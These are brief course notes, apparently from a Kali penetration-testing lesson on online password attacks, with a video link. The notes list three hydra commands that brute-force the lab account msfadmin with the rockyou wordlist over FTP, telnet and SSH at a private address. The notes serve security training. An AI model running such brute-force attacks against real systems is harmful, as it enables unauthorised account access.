# 05_Run an Online Password Attack on Linux

[Run an Online Password Attack on Linux 👉VIDEO &#128279;](https://codered.eccouncil.org/courseVideo/Kali-for-Penetration-Testers?lessonId=46ab63c7-968b-47c0-9752-3d4c93fbeeee&finalAssessment=false)

**Application**

- hydra
  - hydra -l msfadmin -P rockyou.txt ftp://192.168.1.8
  - hydra -l msfadmin -P rockyou.txt telnet://192.168.1.8
  - hydra -l msfadmin -P rockyou.txt ssh://192.168.1.8
